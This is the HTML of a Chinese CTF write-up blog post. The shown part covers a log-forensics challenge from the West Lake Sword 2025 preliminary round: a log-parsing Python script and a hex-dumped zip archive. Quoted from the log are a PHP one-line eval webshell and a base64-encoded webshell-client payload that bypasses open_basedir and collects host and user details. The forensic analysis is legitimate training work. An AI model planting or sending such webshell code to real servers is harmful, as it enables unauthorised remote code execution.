<!DOCTYPE html><html lang="zh-cn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>【Volcania】第八届西湖论剑·网络安全大会初赛Writeup | GamerNoTitle</title><meta name="author" content="GamerNoTitle,admin@bili33.top"><meta name="copyright" content="GamerNoTitle"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="我猜你是那种下载文件夹里一堆“西湖论剑附件”，16:00的时候看着自己的排名发现自己论剑论了个寂寞的玩家   [DS] easydatalog | @Luminoria | 未出 请你对附件中的日志文件进行分析，找出“张三”的身份证号和手机号，譬如其身份证号是119795199308186673，手机号是73628276413，则提交的flag为“119795199308186673_736282">
<meta property="og:type" content="article">
<meta property="og:title" content="【Volcania】第八届西湖论剑·网络安全大会初赛Writeup">
<meta property="og:url" content="https://bili33.top/posts/CTF-West-Lake-2025-Preliminary-round-Writeup/index.html">
<meta property="og:site_name" content="GamerNoTitle">
<meta property="og:description" content="我猜你是那种下载文件夹里一堆“西湖论剑附件”，16:00的时候看着自己的排名发现自己论剑论了个寂寞的玩家   [DS] easydatalog | @Luminoria | 未出 请你对附件中的日志文件进行分析，找出“张三”的身份证号和手机号，譬如其身份证号是119795199308186673，手机号是73628276413，则提交的flag为“119795199308186673_736282">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/msedge_P4uXrm8qF2.jpg">
<meta property="article:published_time" content="2025-01-18T10:35:00.000Z">
<meta property="article:modified_time" content="2026-02-18T14:32:18.988Z">
<meta property="article:author" content="GamerNoTitle">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="西湖论剑">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/msedge_P4uXrm8qF2.jpg"><link rel="shortcut icon" href="https://assets.bili33.top/img/AboutMe/logo-mini.png"><link rel="canonical" href="https://bili33.top/posts/CTF-West-Lake-2025-Preliminary-round-Writeup/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//static.cloudflareinsights.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bili33.top/npm/@fortawesome/fontawesome-free@6.2.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.bili33.top/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.bili33.top/npm/@fancyapps/ui@4.0.31/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?1a9dfff1b560a523701cb01384373c75";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=UA-138072700-2"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-138072700-2');
</script><script defer="defer" data-pjax="data-pjax" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;b259d35cad514e45a226d03906d8fed1&quot;}"></script><link rel="stylesheet" href="https://font.sec.miui.com/font/css?family=MiSans:400,500,700:Chinese_Simplify,Latin&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":180,"position":"top","messagePrev":"本文修改于","messageNext":"天前，如果本文有一定的时效性，那么本文可能已经失效~"},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: {"limitCount":200,"languages":{"author":"Author: GamerNoTitle","link":"Link: ","source":"Source: GamerNoTitle","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source."}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.bili33.top/npm/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.bili33.top/npm/flickr-justified-gallery@2.1.2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '【Volcania】第八届西湖论剑·网络安全大会初赛Writeup',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2026-02-18 22:32:18'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3KdcwFGRWCpapHjZ",ck:"3KdcwFGRWCpapHjZ",autoTrack:true,hashMode:true,screenRecord:true})</script><meta name="referrer" content="no-referrer-when-downgrade" /><meta itemprop="name" content="GamerNoTitle"><meta itemprop="image" content="https://assets.bili33.top/img/AboutMe/logo-mini.png"><meta name="description" itemprop="description" content="欢迎来到GamerNoTitle的博客~"><link rel="stylesheet" type="text/css" href="https://assets.bili33.top/css/twikoo-height.css"><link rel="stylesheet" type="text/css" href="https://assets.bili33.top/css/BB.css"><link rel="stylesheet" type="text/css" href="https://assets.bili33.top/css/twikoo-emotion.css"><link rel="stylesheet" type="text/css" href="https://assets.bili33.top/css/Valine-Emotion.css"><script src="https://assets.bili33.top/js/IPblock.js"></script><script src='https://assets.bili33.top/js/console.js'></script><script src="https://cdn.bili33.top/npm/cardlink"></script><script src="//cdn.bili33.top/npm/matter-js@0.19.0"></script><script>(new Date().getDate() === 1 && new Date().getMonth() === 3) && document.write('<script src="https://cdn.bili33.top/gh/Vikutorika/newassets@master/js/smooth-April-Fools.js"><\/script>')</script><script src="https://npm.elemecdn.com/echarts@4.9.0/dist/echarts.min.js"></script><script src="https://npm.elemecdn.com/echarts@4.9.0/map/js/china.js"></script><script defer src="https://analytics.bili33.top/script.js" data-website-id="eb23a18b-6650-4776-8ded-29107aba832b"></script><script src="/js/solidity.js"></script><link rel="stylesheet" href="/css/solidity.css"><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="http://assets.bili33.top/css/waline-style.css"><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="GamerNoTitle" type="application/atom+xml">
</head><body><link rel="stylesheet" href="https://cdn.bili33.top/npm/gamernotitle-oss@1.0.10/css/barber-shop.css"/><script src="https://cdn.bili33.top/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/AboutMe/logo-mini.png" onerror="onerror=null;src='https://assets.bili33.top/img/link/Akarin.webp'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">140</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">188</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-gamepad"></i><span> Entertainment</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-image"></i><span> Gallery</span></a></li><li><a class="site-page child" href="/GenshinGacha/"><i class="fa-fw fa-solid fa-star-of-david"></i><span> GenshinGacha</span></a></li><li><a class="site-page child" href="/StarRailGacha/"><i class="fa-fw fa-solid fa-ticket"></i><span> StarRailGacha</span></a></li><li><a class="site-page child" href="/ArknightsGacha/"><i class="fa-fw fa-solid fa-gem"></i><span> ArknightsGacha</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i><span> Link</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> Friends</span></a></li><li><a class="site-page child" href="/charts/"><i class="fa-fw fas fa-chart-pie"></i><span> Charts</span></a></li><li><a class="site-page child" href="https://moment.bili33.top/"><i class="fa-fw fa-solid fa-circle-nodes"></i><span> Moment</span></a></li><li><a class="site-page child" href="https://t.me/DohnaNyan"><i class="fa-fw fa-brands fa-telegram"></i><span> Telegram Group</span></a></li><li><a class="site-page child" href="https://t.me/PaffChannel"><i class="fa-fw fas fa-bullhorn"></i><span> Telegram Channel</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/About/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://assets.bili33.top/img/CTF-West-Lake-2025-Preliminary-round-Writeup/msedge_P4uXrm8qF2.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">GamerNoTitle</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-gamepad"></i><span> Entertainment</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-image"></i><span> Gallery</span></a></li><li><a class="site-page child" href="/GenshinGacha/"><i class="fa-fw fa-solid fa-star-of-david"></i><span> GenshinGacha</span></a></li><li><a class="site-page child" href="/StarRailGacha/"><i class="fa-fw fa-solid fa-ticket"></i><span> StarRailGacha</span></a></li><li><a class="site-page child" href="/ArknightsGacha/"><i class="fa-fw fa-solid fa-gem"></i><span> ArknightsGacha</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-heart"></i><span> Link</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> Friends</span></a></li><li><a class="site-page child" href="/charts/"><i class="fa-fw fas fa-chart-pie"></i><span> Charts</span></a></li><li><a class="site-page child" href="https://moment.bili33.top/"><i class="fa-fw fa-solid fa-circle-nodes"></i><span> Moment</span></a></li><li><a class="site-page child" href="https://t.me/DohnaNyan"><i class="fa-fw fa-brands fa-telegram"></i><span> Telegram Group</span></a></li><li><a class="site-page child" href="https://t.me/PaffChannel"><i class="fa-fw fas fa-bullhorn"></i><span> Telegram Channel</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/About/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【Volcania】第八届西湖论剑·网络安全大会初赛Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-01-18T10:35:00.000Z" title="Created 2025-01-18 18:35:00">2025-01-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-18T14:32:18.988Z" title="Updated 2026-02-18 22:32:18">2026-02-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">7.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>41min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="【Volcania】第八届西湖论剑·网络安全大会初赛Writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><div class="note info flat"><p><del>我猜你是那种下载文件夹里一堆“西湖论剑附件”，16:00的时候看着自己的排名发现自己论剑论了个寂寞的玩家</del></p>
</div>

<h2 id="DS-easydatalog-Luminoria-未出"><a href="#DS-easydatalog-Luminoria-未出" class="headerlink" title="[DS] easydatalog | @Luminoria | 未出"></a>[DS] easydatalog | @Luminoria | 未出</h2><blockquote>
<p>请你对附件中的日志文件进行分析，找出“张三”的身份证号和手机号，譬如其身份证号是119795199308186673，手机号是73628276413，则提交的flag为“119795199308186673_73628276413”。</p>
</blockquote>
<p>打开附件，发现error.log体积比较大，里面有很多的内容</p>
<ul>
<li><p>204行发现一句话木马 <code>&lt;?php eval($_POST[1]);?&gt;</code></p>
</li>
<li><p>252行及后面发现多行b64编码内容，且每个的内容不一样</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;lc134a7d99e04f&#x27;</span>]));&amp;lc134a7d99e04f=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoYmFzZTY0X2RlY29kZSgiTHp0OE9pOD0iKSwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLjVkZDljZWVhMyI7QG1rZGlyKCR0bWRpcik7aWYoIUBmaWxlX2V4aXN0cygkdG1kaXIpKXtjb250aW51ZTt9JHRtZGlyPXJlYWxwYXRoKCR0bWRpcik7QGNoZGlyKCR0bWRpcik7QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsICIuLiIpOyRjbnRhcnI9QHByZWdfc3BsaXQoIi9cXFxcfFwvLyIsJHRtZGlyKTtmb3IoJGk9MDskaTxzaXplb2YoJGNudGFycik7JGkrKyl7QGNoZGlyKCIuLiIpO307QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTtAcm1kaXIoJHRtZGlyKTticmVhazt9O307O2Z1bmN0aW9uIGFzZW5jKCRvdXQpe3JldHVybiBAYmFzZTY0X2VuY29kZSgkb3V0KTt9O2Z1bmN0aW9uIGFzb3V0cHV0KCl7JG91dHB1dD1vYl9nZXRfY29udGVudHMoKTtvYl9lbmRfY2xlYW4oKTtlY2hvICI4YyIuImJhNSI7ZWNobyBAYXNlbmMoJG91dHB1dCk7ZWNobyAiMWRkZGVjIi4iZjM1YzE5Ijt9b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH0JIjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJDIiwiWiIpYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNleyRSLj0iLyI7fSRSLj0iCSI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6IiI7JHM9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iCXskc30iO2VjaG8gJFI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0+<span class="number">2</span>V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs=</span><br></pre></td></tr></table></figure></li>
</ul>
<p>让Gemini写了个提取数据的东西</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_and_exclude_data</span>(<span class="params">log_file, save_file</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从日志文件中提取特定的 mod_dumpio 数据，并排除指定的 HTTP 头。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">      log_file: 日志文件路径。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    excluded_headers = [</span><br><span class="line">        <span class="string">r&#x27;^\d+\s+bytes\s+Cache-Control: no-cache\\r\\n$&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;^\d+\s+bytes\s+Upgrade-Insecure-Requests: 1\\r\\n$&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;^\d+\s+bytes\s+User-Agent: .*\\r\\n$&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;^\d+\s+bytes\s+Accept: .*\\r\\n$&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;^\d+\s+bytes\s+Accept-Encoding: .*\\r\\n$&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;^\d+\s+bytes\s+Accept-Language: .*\\r\\n$&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;^\d+\s+bytes\s+\\r\\n$&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line">    all_data = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                match_in = re.search(<span class="string">r&#x27;mod_dumpio:\s+dumpio_in \(data-HEAP\):\s+(.*)&#x27;</span>, line)</span><br><span class="line">                match_out = re.search(<span class="string">r&#x27;mod_dumpio:\s+dumpio_out \(data-HEAP\):\s+(.*)&#x27;</span>, line)</span><br><span class="line">                <span class="keyword">if</span> match_in:</span><br><span class="line">                    data = match_in.group(<span class="number">1</span>).strip()</span><br><span class="line">                    <span class="comment"># 排除 HTTP 头</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">any</span>(re.<span class="keyword">match</span>(header, data) <span class="keyword">for</span> header <span class="keyword">in</span> excluded_headers):</span><br><span class="line">                        all_data.append(data)</span><br><span class="line">                <span class="keyword">if</span> match_out:</span><br><span class="line">                    data = match_out.group(<span class="number">1</span>).strip()</span><br><span class="line">                    <span class="comment"># 排除 HTTP 头</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">any</span>(re.<span class="keyword">match</span>(header, data) <span class="keyword">for</span> header <span class="keyword">in</span> excluded_headers):</span><br><span class="line">                        all_data.append(data)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误：找不到文件 <span class="subst">&#123;log_file&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(save_file, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>.join(all_data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    log_file = <span class="string">&quot;easydatalog/error.log&quot;</span></span><br><span class="line">    save_file = <span class="string">&quot;easydatalog/data.txt&quot;</span></span><br><span class="line">    extract_and_exclude_data(log_file, save_file)</span><br></pre></td></tr></table></figure>

<p>然后在提取的文件发现有压缩包（经典504B）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">504B03041400090063000F8D89592C31EE3BC7050000DF08000008000B00646174612E63737601990700010041450308004D309B474306B8F7C480DF78F2D4E51942F6544FD871D917C99C72175CF3FB5D835C98BB629CEDEDD8CEFDBD663BCA497B2587FAA6AC5FF51A5809C3338FCBC92661921D6F34AE7CEB1E8AB1BAA5ED20BF1A29854EBCF412C5B25F91D3DB68C8E1C69D992566818A464DD0AB71B39F20ED802DBB2FD08F2C2E132E89F84F0497217890B9BE3568A94658E518F45119D538707A61132640B4FCAB9AE27CD4E0EF43AF835F2F79E780E56270893E5CF1DD93186FEE3EF667FDCE145551B08D6A89651D664C9F3E8F8B63192B8AD16B2D0EE1E66A35B0705667DE4FDF78CD0978849CC7E9E443E37F56D941F6D852B64DCFC51A6B23E8768CBBACD2275E15CF4E84E853EF5DC283ED554FD1671D504AB46224B941B01264170A770AA5812B139FECEF658F7D243F952371405A4EE6C4BEF3C2F1C253F6A15B62614903281971D46CD0C529D741E46EEA081E0DE8807F1CA1F4C66A682D7B8B12B807CFA3D1CAE01FAE10BA07DD2994946595FE8BFAA262BDD586C514E709ACABA4DAEA99E7BBBFBC90E429F715EF4CCFDEB0F2E6700E4C2E71182D5173F28DAF4A6CDEFAC852E87D0BC04663A707A5280F80B21182216EDD833CCAC53E3B781B8C220D22DFC4D6D29826C8831007D172E0682B161562248E966ABF440A4042D3F7491DBD89C018E508673B496AB76F430C5271AC28FAA350EC87EDA0901015E33131A522F6EF49DDE30930D06D35F9354BC396A79791E4863C837F1172C7216C47BE70B740949DAB0BADC4C1A0CB1258917B9A557FB4CC4F398A3B1D804C30475683E1AFAECCFA15AAD6E00FBC76E2AC5E48BB67F2F36841E1E19919C2480CFFF0F724970195D397443B2C27A3266559B2ED65D4021317DE10791FCF581D5967E61D62016A56872259706E67CFD12C34E11884006B4698AA1CC2CAAF5007490F615A0EF3DC274D10FFB58069669ED0899A7A03FAEE813D0AA95676AC5806FAAB478FDD00D3BC3779AF308F5F0938AAF8051BB13FDBF09084352714C0A33DD2B6A2660414C0CCF09023864841491FCD0706C8F85D0F9D6EE13B08F1DE91DF0253F0B4AD1C9A7CDF04EC5710BD2B13349AC7D3F487FB610BFD4C8AE26D2A76FAB40F50A5D31769BDAEBC1E80D50949FB133AEBE4AA72A52EE6DF5EA22261EB4CD41A74EFF3A3609E544B8F1C6F0822B5BBC5C7358629696C1C690FD6E646A97ACC0BBFE2E50C57DA09F03C6AB6FBD33A667464924DAD4B8A33D01C7F0202534D41CE794CD3D0C9BB543904A185375114BB9E959693790A910ADAC4305D1FD1457381B65D89952D05A301937DA3733579ED2C89A45895E31070CF8A0891946FBEEF0AC09CF8D8A43661DA8E3AA4B262EF98999425CE3D5587FD56BCEDA2661677A3E0AB5ED0662DF73CA48C2DF77935B0DD1A70A24D3825791AC7EC3B803DEF15C13625A287574BA000B079943A976A29C9727065E4D1A7DA0C819BDEC0BD4919AD8BC0B538A106018BFE2C66E51797ADCAE08E5CC7B485329D2DE1BE78760E4DFEF6B52025F07BC1DF8A41522C14B1294585A96C0E25270B4314E43C396CB374007A33324EE3DDF31C85341F67C85173CC85086BF7FD390D3F6DAA2240641F5F200F9B5D6BE28FA14A480A71C26817573D7FCC29210A29A7FB216774D558354C8DCF7D2AF8B4D04247E57D5F7F84641138FE72CD672B3A873A9435DDE629C842A53F7EF06C9FD3FA49729099E58D1FB9B0597CD88A9031F295765E46BFC640D6D570D0B22FF2095F1EBFDEB8B51A0B9C39DB6F18259BFE9EA92E89B7D7917A8220998818203D6397B6B5F66CC6A02C3EE51AF08536F1C4F59DF3893738C7A59703D3FDE6B6CD26BA95FF291D1E955D89092DCCACD5DF9F62C0130BC1778268E7ACA62B7D56ECA0A3E2D4BD03D29D25371C01349F35108125E1748EE33822B6BF7B3F51EF25579F2AF454E7CF29EC441AB03E53C4C874B361029B9BB2D4126C310EDABCA3C93A8E4CDBFEC3CB79A16C89AFC9A2281B61BEFA189987B2F3D8D3F83833FA5AEEC7AF53E8D56D83D2B2D73DEE5BC624F0CDE21C622CA6B5AC58417DA9AE5C5BA60EA6ECFF8562C65512CD33504B07082C31EE3BC7050000DF080000504B01021F001400090063000F8D89592C31EE3BC7050000DF08000008002F000000000000002000000000000000646174612E6373760A00200000000000010018003A86F4621E4ADB01484F147E1E4ADB01484F147E1E4ADB010199070001004145030800504B0506000000000100010065000000080600000000</span><br></pre></td></tr></table></figure>

